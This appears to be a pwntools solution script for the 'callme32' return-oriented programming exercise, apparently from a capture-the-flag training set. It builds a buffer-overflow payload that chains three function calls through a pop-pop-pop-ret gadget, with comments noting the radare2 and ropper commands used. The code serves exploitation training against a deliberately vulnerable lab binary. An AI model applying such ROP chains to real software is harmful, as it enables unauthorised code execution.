from pwn import *

pr = process("./callme32")

elf = ELF("./callme32")

'''
r2 callme32
-aaaa
-afl * shows all functions

ropper --file callme32 --search pop
-0x080487f9: pop esi; pop edi; pop ebp; ret; * pops the three needed vals and then rets
'''

one = p32(elf.sym["callme_one"])
two = p32(elf.sym["callme_two"])
three = p32(elf.sym["callme_three"])
beef = p32(0xdeadbeef)
babe = p32(0xcafebabe)
dude = p32(0xd00df00d)
treepop = p32(0x080487f9)

fluff = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"

payload = fluff + one + treepop + beef + babe + dude + two + treepop + beef + babe + dude + three + treepop + beef + babe + dude

pr.sendline(payload)
print pr.read()
